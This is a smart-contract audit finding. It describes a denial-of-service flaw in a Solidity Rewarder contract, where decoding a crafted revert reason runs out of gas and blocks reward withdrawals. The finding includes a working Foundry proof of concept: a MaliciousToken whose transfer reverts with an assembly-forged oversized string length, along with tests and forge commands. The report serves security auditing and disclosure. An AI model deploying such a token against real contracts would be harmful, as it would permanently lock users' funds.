## About the contrat rewarder

### Purpose:

This contract manages a reward system where users can give rewards as tokens to other users by calling giveReward(address _user , IERC20 _token , uint _amount ) with ,specifying the user's address, token address, and reward amount

Users can withdraw their accumulated rewards by calling withdrawRewards() .

## Finding


### [H-1] A Denial of Service (DoS) attack in the Rewarder::giveReward function enables malicious actors to reward malicious tokens to users, thereby impeding their ability to retrieve all of their other rewards. 

**Description:** 

A malicious user can reward a normal user with a malicious token using the `Rewarder::giveReward` function. This token subsequently causes a revert in the `Rewarder::withdrawReward` function for the affected user, thereby preventing them from claiming their rewards.

When a user calls `Rewarder::withdrawReward` , for each reward/token he has , this code snippet runs :

``` java
try token.transfer(msg.sender , amount) {
                delete rewards[msg.sender][i];
            } catch (bytes memory reoson ) {
                string memory revertReoson = getRevertMessage(reoson);
                emit RewardTransferFailed(revertReoson);
            }
```
The hacker can manage to create a token where they override the transfer method in a way it results in a revert/error. They then manipulate the error message from token.transfer in such a way that it triggers an Out of Gas scenario. Specifically, they construct a series of bytes (reason) that, when passed to `rewarder::getRevertMessage`, exhausts the gas when attempting to decode the bytes into a string: `getRevertMessage(reason)`. This action effectively halts the entire transaction, preventing any tokens from being withdrawn.

**Impact:**
A user will never be able to withdraw the tokens he owns ; the tokens will remain stuck in the contract indefinitely.

**Proof of Concept:**
Firstly, let's generate a token that, when rewarded to a user, will hinder them from withdrawing any remaining rewards. These tokens will be permanently locked within the contract.

```java
contract MaliciousToken is ERC20 {
    constructor() ERC20 ("BAD" , "TOKEN") {
        _mint(msg.sender, 100);
    }

    function transfer(address to, uint256 value) public override  returns (bool)  {
        assembly {
            let free_memory := mload(0x40)
            mstore(free_memory , 0x08c379a000000000000000000000000000000000000000000000000000000000)
            mstore(add(free_memory , 4) , 0x20)
            mstore(add(free_memory , 36) , 0xfffffffffffffffffffffffffffffff )
            revert(free_memory , 100)
        }
    }

}
```

The transfer method leads to an unavoidable scenario where a revert occurs, with the revert message indicating from "free_memory" to 100. 

The first word, "free memory," stores the selector: bytes4(0x08c379a0). The second word is the head, with 0x20 pointing to the third word.

The third word marks the beginning of the string and should contain the string's size. By inputting a large number in that position, the EVM will endlessly attempt to decode the  fake-large string provided. In reality, it will only parse empty words in memory. But that would be enough to invoke oog.

Let's execute this in Foundry.

To start, let's deploy 10 valid tokens and transfer them to the contract (address(this)). Subsequently, we'll initiate a withdrawal process to retrieve these tokens.

```java
contract GoodToken is ERC20 {
    constructor() ERC20("GOOD" , "TOKEN") {
        _mint(msg.sender, 100);
    }
}
contract testRewarder is Test {
    Rewarder rewarder;
    function setUp() public {
        rewarder = new Rewarder();
    }

    function testReward() public {
        //create a list of tokens
        IERC20[] memory tokens = new IERC20[](10);
        for (uint i=0 ; i<10 ; i++){
            //deploy the token and store its address in the array
            tokens[i] = new GoodToken();
            //we have to approve the rewarder to spend the tokens 
            tokens[i].approve(address(rewarder), 100);
            rewarder.giveReward(address(this), tokens[i] , 100);
        }

        //by the end of this loop , address(this) should have 10 tokens (stored in the array tokens) with a balance of 100 each.
        // Let's create a loop in which we verify this 

        for (uint i=0 ; i<10 ; i++){
            (IERC20 token , uint amount) = rewarder.rewards(address(this) , i);
            assert(token == tokens[i]);
            assert(amount == 100);
        }
    }

    function testWithrawOnlyGoodTokens() public {
        testReward();
        rewarder.withdrawRewards();
        (IERC20 token , uint amount) = rewarder.rewards(address(this) , 0);
        //let's check that all tokens are withrawn 
        assertEq(address(token) ,  address(0));
        assertEq(amount, 0);
    }



```
In a foundry project , Open the terminal and run 
```bash
forge test --match-test testReward -vv
forge test --match-test testWithrawOnlyGoodTokens -vv
```

Both commands will return that the functions have been successfully executed.

Now, let's attempt to reward the contract with 10 valid tokens along with 1 malicious token, and then test whether the function will fail or not:

```java
    function testWithdrawMalicious() public {
        testReward();
        IERC20 maliciousToken = new MaliciousToken();
        maliciousToken.approve(address(rewarder), 1);
        rewarder.giveReward(address(this), maliciousToken , 1);

        vm.expectRevert();
        rewarder.withdrawRewards();
    }
```
Open the terminal and run :

```bash
forge test --match-test testWithdrawMalicious -vv
```
"And the test should pass once more, indicating that a revert occurred."
Below is the test script, please note that it will only function within a Foundry project environment :

```java
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import {Rewarder} from "../src/Rewarder.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousToken is ERC20 {
    constructor() ERC20 ("BAD" , "TOKEN") {
        _mint(msg.sender, 100);
    }

    function transfer(address to, uint256 value) public override  returns (bool)  {
        assembly {
            let free_memory := mload(0x40)
            mstore(free_memory , 0x08c379a000000000000000000000000000000000000000000000000000000000)
            mstore(add(free_memory , 4) , 0x20)
            mstore(add(free_memory , 36) , 0xfffffffffffffffffffffffffffffff )
            revert(free_memory , 100)
        }
    }

}

contract GoodToken is ERC20 {
    constructor() ERC20("GOOD" , "TOKEN") {
        _mint(msg.sender, 100);
    }
}


contract testRewarder is Test {
    Rewarder rewarder;
    function setUp() public {
        rewarder = new Rewarder();
    }

    function testReward() public {
        IERC20[] memory tokens = new IERC20[](10);
        for (uint i=0 ; i<10 ; i++){
            tokens[i] = new GoodToken();
            tokens[i].approve(address(rewarder), 2);
            rewarder.giveReward(address(this), tokens[i] , 2);
        }

        for (uint i=0 ; i<10 ; i++){
            (IERC20 token , uint amount) = rewarder.rewards(address(this) , i);
            assert(token == tokens[i]);
            assert(amount == 2);
        }
    }

    function testWithrawOnlyGoodTokens() public {
        testReward();
        rewarder.withdrawRewards();
        (IERC20 token , uint amount) = rewarder.rewards(address(this) , 0);
        assertEq(address(token) ,  address(0));
        assertEq(amount, 0);
    }

    function testWithdrawMalicious() public {
        testReward();
        IERC20 maliciousToken = new MaliciousToken();
        maliciousToken.approve(address(rewarder), 1);
        rewarder.giveReward(address(this), maliciousToken , 1);

        vm.expectRevert();
        rewarder.withdrawRewards();
    }
}

```
